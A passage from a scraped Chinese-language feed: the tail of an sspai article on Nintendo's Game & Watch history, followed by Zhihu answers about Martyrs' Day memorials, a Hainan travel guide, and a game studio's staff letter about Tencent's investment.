小时的标准续航时间，虽然在待机状态下电池寿命可以进一步延长，但这个成绩对于电子表来说显然并不够格。在那个年代，电池的价格并不如现在这样低廉，而一块需要经常换电池的电子表一定会逼迫消费者考虑长期使用中所花费的额外成本。而且，<strong>横井军平设想中作为卖点的游戏功能毕竟只是陪衬，次要功能的优势无法和主要功能的缺失功过相抵，这无疑会打消大多数普通用户的购买欲望</strong>。对于这个直指要害的问题，横井军平无言以对，山内溥却笑了。</p>\n<h3>\n<strong>「</strong>一切问题的解决办法，就在 Game &amp; Watch 这个名字上。<strong>」</strong>\n</h3>\n<p>作为如今任天堂的缔造者，山内溥无数次用天才的决策证明了自己并非虚有其表的纨绔子弟，这一次也不例外。看着自己面前沉默的横井军平，山内溥给出了自己的解法：「Game」在先，「Watch」在后。山内溥敏锐的意识到了 Game &amp; Watch 足以改变行业打法的强大产品力，<strong>虽然 Game &amp; Watch 作为电子玩具的受众相对较窄，但锦上添花的电子表功能给了更多普通消费者「说服」自己购买它的理由；虽然 30 小时的续航对于电子表来说不值一提，但对于电子玩具来说则堪称「恐怖」</strong>。一语点醒梦中人，看着自己眼前微笑的山内溥，横井军平不由得感慨万分。</p>\n<h2>又高又硬！</h2>\n<p>这句话不是横井军平吹捧山内溥的决策能力「又高又硬」，而是 Game &amp; Watch 本身的表现的确又高又硬：销量高，实力硬。自 1980 年 4 月 28 日发布，Game &amp; Watch 的销量一路高歌猛进，在短短八个月内达到了惊人的 300 万部。而任天堂「卖硬件不亏本」的传统自那时起就已经注定：Game &amp; Watch 的关键部件均是来自夏普的成熟技术产品，彼时夏普和卡西欧刚好在日本本土的电子计算器市场打了一场恶仗，期间所积压的库存亟待清理，任天堂和夏普一拍即合，以相当低廉的价格购入了大量电子计算器的元器件以完成 Game &amp; Watch 的设计和制造。<strong>以低廉成本制造的 Game &amp; Watch 尽管同样以低廉的售价迅速占领市场，但产品利润依然有充分的保障</strong>，作为掌机大战中最爱打价格战的一方，任天堂早在 20 世纪 80 年代就开始「学坏」了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/28/13f9893e303aaf080d14f596b84078eb.jpg\"><figcaption>Game &amp; Watch 在停产后的多年里数次复刻，最新的机型于2020年11月13日发售</figcaption></figure><p>Game &amp; Watch 在商业上的成功终于给生死线上的任天堂吊住了一口气，实现了业绩的触底反弹，到了 1980 年底，任天堂已经靠着 Game &amp; Watch 的盈利清偿了大量债务，而 Game &amp; Watch 的热销自然被其他厂商看在眼里，卡西欧等原本制造电子计算器的厂商也开始转而生产同类产品，既能瓜分任天堂开辟的新兴市场，又可以借机消化库存，就是想要站着把钱给赚了。在竞争愈发激烈的同时，任天堂也在加紧对 Game &amp; Watch 的更新，许多我们所熟知的任天堂要素逐渐在 Game &amp; Watch 的系列机型上出现，其中最具标志性的十字键就是在 Game &amp; Watch 的《森喜刚》掌机上首次搭载，更值得一提的事，《森喜刚》中由玩家控制的角色「Jump Man」最终成为了现在的马力欧。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/28/65a1d6f5b1af1d885068741b4a70ffb3.jpg\"><figcaption>《森喜刚》别具一格的外形设计本是为扩展游戏内容做出的妥协，却成为了 NDS 掌机的设计灵感</figcaption></figure><p>无疑，Game &amp; Watch 是一款伟大的产品，<strong>作为现代游戏掌机的初次试探，Game &amp; Watch 以受到历史局限的技术水平突破了历史的局限性，可谓奇迹。横井军平「基于枯萎技术的水平思考」的理念得以在 Game &amp; Watch 上实践，并贯彻任天堂历代产品的始终</strong>。所以，尽管玩家们始终对「游戏性」的定义争论不休，尽管游戏的形式和载体在几十年的发展历程中发生了翻天覆地的变化，但无论如何，我们从中获得的快乐是始终无法取代的。</p>\n<h2>参考文献</h2>\n<ul>\n<li><a href=\"https://www.chuapp.com/article/287267.html\">前掌机时代：计算器、游戏手表和Game &amp; Watch</a></li>\n<li><a href=\"https://www.cbr.com/nintendo-game-watch-turns-40/\" target=\"_blank\">Game &amp; Watch Turns 40: A Look Back at Nintendo's First Gaming Success</a></li>\n<li><a href=\"https://nintendo.fandom.com/wiki/Game_%26_Watch_(series)\" target=\"_blank\">Game &amp; Watch (series) | Nintendo | Fandom</a></li>\n<li><a href=\"https://nintendo.fandom.com/wiki/Hiroshi_Yamauchi\" target=\"_blank\">Hiroshi Yamauchi | Nintendo | Fandom</a></li>\n<li><a href=\"https://nintendo.fandom.com/wiki/Gunpei_Yokoi\" target=\"_blank\">Gunpei Yokoi | Nintendo | Fandom</a></li>\n<li>本文部分图片来自 <a href=\"https://www.nintendolife.com/\">Nintendo Life</a> 与 <a href=\"https://www.cbr.com/\">CBR.com</a>\n</li>\n</ul>\n<h4>关联阅读</h4>\n<ul>\n<li><a href=\"https://sspai.com/post/66516\" target=\"_blank\">游戏摄影和我的故事：在电子游戏中寻找定格的艺术</a></li>\n<li><a href=\"https://sspai.com/post/63992\" target=\"_blank\">躺在床上也能爽玩：我的 Switch 配件选购指南</a></li>\n<li><a href=\"https://sspai.com/post/67275\" target=\"_blank\">任天堂 E3 2021 直面会回顾：《塞尔达传说 旷野之息》续篇明年发售</a></li>\n</ul>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派会员？<a href=\"https://sspai.com/prime\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/69001"},{"title":"9 月 30 日是烈士纪念日，今天该如何缅怀他们，才能走得更有力？","date":"2021-09-30 03:23:27","description":"\n<p>#烈士纪念日#  中部战区陆军第81集团军某合成旅英雄营，组织刚下连的新兵和入党积极分子前往红一师和铁甲元勋英雄园，向烈士雕像敬献鲜花、重温入党誓词，激励广大官兵传承红色血脉，汲取信仰力量，奋斗强军！</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhong-bu-zhan-qu-57?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">中部号角</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/489785273/answer/2147814891?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">233 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/489687295?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">今天是我国第八个烈士纪念日。我们可以通过怎样的方式来纪念他们？你有哪些话，想对英烈诉说？</a><br><a href=\"http://www.zhihu.com/question/319927345?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">去参加烈士陵园可以发朋友圈吗？</a><br>\n","link":"http://www.zhihu.com/question/489785273/answer/2147814891?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"9 月 30 日是烈士纪念日，今天该如何缅怀他们，才能走得更有力？","date":"2021-09-30 02:28:56","description":"\n<p><b>9月30日</b></p>\n<p><b>是烈士纪念日</b></p>\n<p>每一个中国人都该铭记的日子</p>\n<p>近代以来</p>\n<p>据不完全统计约有<b>2000万</b>名烈士英勇牺牲</p>\n<p>他们用生命和无畏捍卫民族尊严</p>\n<p>用英勇和热血为后世迎来新生</p>\n<p><img src=\"https://pic3.zhimg.com/v2-8129a61c465cd0f6787f4bdf7de4d202_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1870\" data-watermark=\"original\" data-original-src=\"v2-8129a61c465cd0f6787f4bdf7de4d202\" data-watermark-src=\"v2-2ecd51fd3104e186808cbd5cd4376af6\" data-private-watermark-src=\"v2-b260bfff640a30445bfe3cb9abd4142d\"></p>\n<p>烈士纪念日</p>\n<p>定在国庆前一天</p>\n<p>就是要我们铭记</p>\n<p><b>没有抛头颅、洒热血的英烈</b></p>\n<p><b>就没有今天繁荣富强的中国</b></p>\n<p>今天全国<b>8个省份24座</b>烈士陵园</p>\n<p><b>线上线下共同致敬英烈</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-898f09fd18272d01cd17450549e195dd_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2347\" data-rawheight=\"1079\" data-watermark=\"original\" data-original-src=\"v2-898f09fd18272d01cd17450549e195dd\" data-watermark-src=\"v2-222a5c96ebd024b327caf461885a508b\" data-private-watermark-src=\"v2-809c68b1accdfe24c991f7f3305e4d6c\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-b89752dbffa9dd8c7f09a56f55f5416c_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4032\" data-rawheight=\"3024\" data-watermark=\"original\" data-original-src=\"v2-b89752dbffa9dd8c7f09a56f55f5416c\" data-watermark-src=\"v2-5d1391bd11c911ccee1f4476df1af499\" data-private-watermark-src=\"v2-caf893ba5d8ab2fef19060f299e061e2\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-39e84caadd6823cdec24768b1870f57e_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"1080\" data-watermark=\"original\" data-original-src=\"v2-39e84caadd6823cdec24768b1870f57e\" data-watermark-src=\"v2-686d62aade106332262d8e467b0a90d7\" data-private-watermark-src=\"v2-4c5b99ed1dbfd924ae8c2dec2ac604ab\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-0bf23af9709baa7d7d84dd8674d423e3_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4032\" data-rawheight=\"3024\" data-watermark=\"original\" data-original-src=\"v2-0bf23af9709baa7d7d84dd8674d423e3\" data-watermark-src=\"v2-e8b9c82111491c6f6d742218b1d3e2fd\" data-private-watermark-src=\"v2-2e9e5f97c4abe6a0be8383a06cfc9c11\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-0a4f7031db65454b8fe781f9a8dfd0dd_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3840\" data-rawheight=\"2160\" data-watermark=\"original\" data-original-src=\"v2-0a4f7031db65454b8fe781f9a8dfd0dd\" data-watermark-src=\"v2-dee7e4bd2c1c4f1b90964a0a3af3988a\" data-private-watermark-src=\"v2-e36d788a2788ea6fa191d7185c1cadbe\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-c673fb7f315aacb6f7fa438b2b4eb5f1_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4032\" data-rawheight=\"3024\" data-watermark=\"original\" data-original-src=\"v2-c673fb7f315aacb6f7fa438b2b4eb5f1\" data-watermark-src=\"v2-e921cb02ffb054f23c0fa06b94013edd\" data-private-watermark-src=\"v2-d9e37f288422b8dfda6ae067ac8d9d32\"></p>\n<p><b>24座烈士陵园一览：</b></p>\n<p>辽宁省沈阳抗美援朝烈士陵园</p>\n<p>浙江省宁波樟村四明山革命烈士陵园</p>\n<p>江苏省连云港市海州区青龙山革命烈士陵园</p>\n<p>云南省宣威市虎头山红军烈士陵园</p>\n<p>浙江省丽水松阳县烈士陵园</p>\n<p>浙江省杭州市革命烈士纪念馆</p>\n<p>浙江省台州市解放—江山岛烈士陵园</p>\n<p>江苏省南京市雨花台烈士陵园</p>\n<p>江苏省扬州市高邮市烈士陵园</p>\n<p>江苏省盐城市革命烈士陵园</p>\n<p>江苏省如皋市烈士陵园</p>\n<p>江苏省无锡革命烈士陵园</p>\n<p>江苏省海门区烈士陵园</p>\n<p>安徽省亳州皖北烈士陵园</p>\n<p>河北省邢台市冀南烈士陵园</p>\n<p>河北省秦皇岛烈士陵园</p>\n<p>河北省张家口市察哈尔烈士陵园</p>\n<p>江西省抚州烈士陵园</p>\n<p>云南省文山烈士陵园</p>\n<p>云南省屏边烈士陵园</p>\n<p>云南省昭通市威信县扎西红军烈士陵园</p>\n<p>云南省麻栗坡烈士陵园</p>\n<p>云南省西畴县南疆烈士陵园</p>\n<p>广西壮族自治区烈士陵园</p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhong-guo-tui-yi-jun-ren-80?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">中国退役军人</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/489785273/answer/2147711322?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">233 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/489687295?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">今天是我国第八个烈士纪念日。我们可以通过怎样的方式来纪念他们？你有哪些话，想对英烈诉说？</a><br><a href=\"http://www.zhihu.com/question/319927345?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">去参加烈士陵园可以发朋友圈吗？</a><br>\n","link":"http://www.zhihu.com/question/489785273/answer/2147711322?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"2021 年国庆节可以去那些低风险的地方游玩？","date":"2021-09-30 02:27:49","description":"\n<p>推荐海南西海岸。这里人相比三亚来说，真的少太多了。而且处于半开发状态，适合年轻人结伴来此自驾游。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-85d22404f201d62c2b28b86fbb6bed5b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"watermark\" data-original-src=\"v2-85d22404f201d62c2b28b86fbb6bed5b\" data-watermark-src=\"v2-79477ee71b21756776944b6d4ef84037\" data-private-watermark-src=\"v2-615dcd2fc6311b37c4268b2cebcd83fb\"></p>\n<h3>（1）海南乐东黎族自治县龙沐湾——号称最美日落海滩</h3>\n<p>被称为最美日落海滩是有原因的，龙沐湾的整个海滩全部面朝西方，无任何遮挡，整个海岸线绵延漫长，不管身处哪一个位置，都能看到最完整的日落。日日皆不同，夕阳的光晕是有层次的。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-1df16e94086fb263962129912dadfb5f_720w.jpg?rss\" data-caption=\"海南乐东龙沐湾日落海滩\" data-size=\"normal\" data-rawwidth=\"3802\" data-rawheight=\"2139\" data-watermark=\"watermark\" data-original-src=\"v2-1df16e94086fb263962129912dadfb5f\" data-watermark-src=\"v2-71b6f34384ff0314818ef7a93536a64e\" data-private-watermark-src=\"v2-f7743b44a823c74ed84b636e0ed74e9d\"></p>\n<p>看过很多国家，很多地点不同的日落之后，我们俩依然对看一场完整的日落乐此不疲，我想或许是因为我们内心，永远充满对大自然本色的倾慕。倾慕它的善变多端，层次分明，色彩斑澜。</p>\n<p>在龙沐湾，客观的说这里没什么商业化，很多人觉得不方便，但是我们很喜欢。</p>\n<a href=\"https://www.zhihu.com/zvideo/1407123176204210176\">太划算了！海南三亚一路向西，人少景美的龙沐湾了解一下</a><p>当整个太阳一股脑儿地掉进大海里，整个海面都变得通红，张扬得像目中无人的野兽，尽情释放所有热烈。海浪也变得通红，层层叠叠循环往复地扑向沙滩。观看的人并不多，起码还可以随时拍摄一张四顾无人的剪影。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-047870e3c9401df84e8677d13b732a0c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3681\" data-rawheight=\"2945\" data-watermark=\"watermark\" data-original-src=\"v2-047870e3c9401df84e8677d13b732a0c\" data-watermark-src=\"v2-119182b1cb2e02316d481fb1c15a9906\" data-private-watermark-src=\"v2-6f6043478e47e1be9c7e6b48900f8ad7\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-084a7d4b22daeeaa19e74ffd08e9d9a0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4032\" data-rawheight=\"2268\" data-watermark=\"watermark\" data-original-src=\"v2-084a7d4b22daeeaa19e74ffd08e9d9a0\" data-watermark-src=\"v2-f8fe652168b7e3164a5eebb2da7f7be6\" data-private-watermark-src=\"v2-b023233f840d5c70de300529bbfacbfb\"></p>\n<p>登上远处的瞭望塔，拍摄一段延时摄影。记录下太阳消逝的整个过程。把半小时浓缩成一分钟。也是很美的事情。</p>\n<p>在龙沐湾我们遇到很多从其他省市来到海南工作的年轻人，我们在和他们的交谈中，感受到了发自内心的骄傲和自豪。</p>\n<p>龙沐湾日落海滩的工作人员告诉我们，他当年来到这儿的时候，整个沙滩都是荒凉的什么都没有，是他们从零开始打造，有了水上项目，还有露营场地，健身器材等设施，也给当地年轻人提供了很多就业机会。他们说那儿的日落百看不厌，他们就希望有更多人可以知道龙沐湾，去感受他们的幸福，体验他们为游客打造的这片乐园。</p>\n<h3>（2）海南东方市白查村——最后一个船型屋</h3>\n<p><img src=\"https://pic4.zhimg.com/v2-e409908280176424ee715c70470cba29_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2000\" data-rawheight=\"1126\" data-watermark=\"watermark\" data-original-src=\"v2-e409908280176424ee715c70470cba29\" data-watermark-src=\"v2-6c9e186905d5df2a00f53d6cfa5d2e86\" data-private-watermark-src=\"v2-e6b58013bfab7d6ac5b4037e0508667f\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-e887ea6a4a38d129eba0faf32fc4e0f1_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2000\" data-rawheight=\"1126\" data-watermark=\"watermark\" data-original-src=\"v2-e887ea6a4a38d129eba0faf32fc4e0f1\" data-watermark-src=\"v2-67e924527cca87d29e74d79487d107dc\" data-private-watermark-src=\"v2-385ec2487635525dd649a73003ce19c4\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-1983560e99626e9f0da3ced9d92a84f0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2000\" data-rawheight=\"1126\" data-watermark=\"watermark\" data-original-src=\"v2-1983560e99626e9f0da3ced9d92a84f0\" data-watermark-src=\"v2-8524958d1eff8c878791752c9f62aac2\" data-private-watermark-src=\"v2-f42e53a96f113241c97b26f552647d81\"></p>\n<p>白查村的茅草房犹如一艘艘倒扣的船，村民习惯称之为“船形屋”。</p>\n<p>白查村是海南船形屋保存得最完整的自然村落之一。现在只剩下房子，村民均已搬出。我们去的当天，加上我们不到10个参观的游客。</p>\n<p>传说当年黎族的祖先坐船来到海南岛，岛上什么都没有，他们就把船翻出来当作房子居住，后来为了纪念自己的祖先，黎族人依然把房子建设成倒扣的船型结构。</p>\n<p>我们看到的村子，每一个茅草屋都不一样，大大小小，还有不同的用处，有粮仓有商店，是非常独特的原始风貌，也是独属于海南的人文历史。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-2bf1a508bf83f2c567699dd948e1ad19_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2000\" data-rawheight=\"1126\" data-watermark=\"watermark\" data-original-src=\"v2-2bf1a508bf83f2c567699dd948e1ad19\" data-watermark-src=\"v2-88b42fa710ba8e4e203a310d99f73883\" data-private-watermark-src=\"v2-f1b69ff5b0b67e17f1154e7e47d58133\"></p>\n<h3>（3）海南乐东黎族自治县莺歌海盐场——青春灿烂的日子</h3>\n<a href=\"https://www.zhihu.com/zvideo/1408924464239669248\">海南莺歌海盐场，有历史的“天空之境”，原来沧海变盐田不是传说</a><p>莺歌海盐场建于1958年，莺歌海盐场是海南岛最大的海盐场，也是中国三大海盐场之一。</p>\n<p>我们当时听了莺歌海盐场工作人员的介绍，得知建设盐场时，是退伍和转业的五千多名解放军参与建设的，当年这些支持建设的人，同时也带来了先进的文化，比如歌舞，音乐，电影等。是属于父辈的激情燃烧的历史。</p>\n<p>莺歌海人，不光用汗水换来了白花花、亮晶晶的原盐，同时也给后人留下了更加宝贵的精神财富：莺歌海精神。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-3e07d3bdefb0afda77d729e40e7f2203_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2000\" data-rawheight=\"1126\" data-watermark=\"watermark\" data-original-src=\"v2-3e07d3bdefb0afda77d729e40e7f2203\" data-watermark-src=\"v2-31e6fdee4f405af1144ea7daa07c1ca6\" data-private-watermark-src=\"v2-76580885c28d2ae8eeff9299ff47376d\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-d1ae3d86a8ca7576b4d84e614d69b3d0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2000\" data-rawheight=\"1125\" data-watermark=\"watermark\" data-original-src=\"v2-d1ae3d86a8ca7576b4d84e614d69b3d0\" data-watermark-src=\"v2-9e0094f3cde01f96b67d3d60a89cdf73\" data-private-watermark-src=\"v2-06890d6ff29fcfb7ce8b68b8aab479a7\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-cfc219a4b9ccf641237e6a9e86a05f7f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2000\" data-rawheight=\"1126\" data-watermark=\"watermark\" data-original-src=\"v2-cfc219a4b9ccf641237e6a9e86a05f7f\" data-watermark-src=\"v2-2e4e388382ed68749eac3f9cce1a0123\" data-private-watermark-src=\"v2-839130d5024957c97f79b5b319fd9265\"></p>\n<p>郭沫若也曾赋诗：“盐田万顷莺歌海，四季常春极乐园。驱遣阳光充炭火，烧干海水变银山。”</p>\n<p><img src=\"https://pic3.zhimg.com/v2-ec1595d2d787acaab0735f67f8a6e239_720w.jpg?rss\" data-caption=\"莺歌海盐场时光隧道——蒸汽火车\" data-size=\"normal\" data-rawwidth=\"2000\" data-rawheight=\"1126\" data-watermark=\"watermark\" data-original-src=\"v2-ec1595d2d787acaab0735f67f8a6e239\" data-watermark-src=\"v2-9d42ff0e8c3c42b493d81a889238cd3b\" data-private-watermark-src=\"v2-065b02a84d33cab2dc48a1ef69274bc0\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-697980ec463a186252793cb5a26daa88_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2000\" data-rawheight=\"1126\" data-watermark=\"watermark\" data-original-src=\"v2-697980ec463a186252793cb5a26daa88\" data-watermark-src=\"v2-f8166ea9bb3145d79563636de5f8ab22\" data-private-watermark-src=\"v2-43e557488eeadcaffcacdab35727a3aa\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-63e7e44b31409899bd9cf31b6b9161ee_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3000\" data-rawheight=\"1688\" data-watermark=\"watermark\" data-original-src=\"v2-63e7e44b31409899bd9cf31b6b9161ee\" data-watermark-src=\"v2-bf8a83feac2c492d024941fcb31616b2\" data-private-watermark-src=\"v2-ed1ad2ba54eb9dfd37a3e9a74c39a727\"></p>\n<p>我们在工作人员的带领下，有幸体验了耙盐，当日烈日当空照，我们刚尝试了几下就汗如雨下，可以感知当年开发盐场时，父辈人吃苦耐劳精神。</p>\n<h3>（4）温德姆至尊豪廷——推荐附近住宿</h3>\n<p><img src=\"https://pic1.zhimg.com/v2-d4b2b74aaf762ce3bd5c569d2ce0f8e3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"3000\" data-rawheight=\"1688\" data-watermark=\"watermark\" data-original-src=\"v2-d4b2b74aaf762ce3bd5c569d2ce0f8e3\" data-watermark-src=\"v2-7ad618ca15932761bf875a52238b4474\" data-private-watermark-src=\"v2-e8cc9bd4f734701e918525ca8f7b696f\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-2d9198fa83b76281d27562d5e29945d9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2000\" data-rawheight=\"2800\" data-watermark=\"watermark\" data-original-src=\"v2-2d9198fa83b76281d27562d5e29945d9\" data-watermark-src=\"v2-81ae8d692b40d039ea642be6683fea19\" data-private-watermark-src=\"v2-48279bd49144c8f336b69a5af8df37e3\"></p>\n<p>五星级，酒店对面就是龙沐湾海滩。步行过去即可。度假村人不是很多。房子之间有摆渡车。</p>\n<p>可以租黎族服饰穿一穿。感受少数民族风情。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/susutuotuo?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">素素拓拓的旅行派</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/488676448/answer/2147045974?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">24 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/346088548?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">国庆节要不要出游？</a><br><a href=\"http://www.zhihu.com/question/484001462?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">2021 年的国庆节你在哪座城市？有什么出游计划？</a><br>\n","link":"http://www.zhihu.com/question/488676448/answer/2147045974?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何看待腾讯入股手机游戏《影之刃》开发商灵游坊，持股 25% ？","date":"2021-09-30 02:22:02","description":"\n<p>因为有不少朋友都在问，所以把我们最近全员内部邮件整理公开给大家看看。其实，办公司最开心的时候，莫过于面对全体成员说出最后那几句话看着大家欢呼雀跃的时候了。</p>\n<p>欢迎对我们后续项目有进一步兴趣的UE大神们随时私信我~</p>\n<p><br></p>\n<p>++++++++++分割线++++++++++</p>\n<p><br></p>\n<p>灵游坊的全体同事们：</p>\n<p>今年是灵游坊成立的第十年，哪怕是从开始做手游算起，也有七年了。</p>\n<p>在行业中，有些同样从业年限的同行朋友，已经达到了非常顶尖的成就，但也有更多的同行已经不再从事这个行业。磕磕碰碰的十年历程中，我们做出了一些小成绩，也有不少的失败和遗憾，虽然没有商业大成，但也颇具特色，乐在其中。</p>\n<p>“挥剑破局，不堕凶道”，正如影之刃中的侠客们既要打败敌人，又要坚守内心。企业的发展总有许多坎坷，有一些需要我们做出改变，但支撑我们发展的，却是那些不变的东西：</p>\n<p><b><i>我们始终坚持原创IP，从不改编，代工，依赖大IP授权，也不涉及经典名著和真实历史。</i></b>从多年前我在大学宿舍中独自创作的《雨血》独立游戏，一直到《影之刃1~3》的手游三部曲，我们创造了一个混搭了武侠和幻想元素的架空世界“影境”。</p>\n<p>在精神内核上，中国古典侠义精神，近现代新武侠浪潮的启发，“虽千万人，吾往矣”，“路见不平，拔刀相助”的英雄气概，又或是“人在江湖，身不由己”的惆怅，构成了我们一个个架空原创人物及故事的基本框架。在外在表现上，我们深入研究中国传统美术技法与现代动画技术的融合，创造了水墨笔触+传统配色+飘逸的动作设计相结合的全新视觉范式，以及在琵琶，尺八，马头琴等传统乐器中融入摇滚，电子音乐现代元素的音乐风格。我们的架空世界依托于脚下这片土地深厚的文化底蕴而打造，体现着中华文化中一些独有的思考和审美。 </p>\n<p><img src=\"https://pic3.zhimg.com/v2-0b1b03cbc0fa4db910487bae4942f738_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1920\" data-rawheight=\"1080\" data-watermark=\"watermark\" data-original-src=\"v2-0b1b03cbc0fa4db910487bae4942f738\" data-watermark-src=\"v2-01ff35e790d99c8e82367b3eef2b47fc\" data-private-watermark-src=\"v2-57864b695f18ea7d2e8bf5907856981f\"></p>\n<p>我们坚持一种独特的研发模式，这种研发模式不强调程序，策划，美术之间泾渭分明的专业分工，而是将每个人首先赋予“游戏玩家”和“综合开发者”的属性，并鼓励每个人跳出专业壁垒，用自己身为玩家的常识去判断当前工作的成果。<b><i>除紧急事故，版本节点等情况外，我们大体保持了早10晚7，一周5天的工作制度</i></b>——这并非是什么难能可贵的选择，而是我们这种研发模式下的必然：每个同事都是一个不可替代的，鲜活的个体，而非一个工具，如果要充分发挥每个人的价值，我们必须创造足够的条件，让每个人被兴趣爱好，运动，美食，音乐，爱，美的事物以及优秀的游戏所环绕。</p>\n<p>我们接下来的全部产品，都将尽可能地实现全球范围内独立发行，并尽可能地避免买量发行为主的模式，而更多采用像那些传统主机上的出色中小团队那样，构建足够稳固的核心玩家群体和品牌调性。正如我们将同事们视为人，而非工具，同样，我们也将玩家视为人，而非数据。</p>\n<p>在马上开幕的TGS2021（东京电玩展）中，以《影之刃3》为基础打造的全新跨平台游戏《Phantom 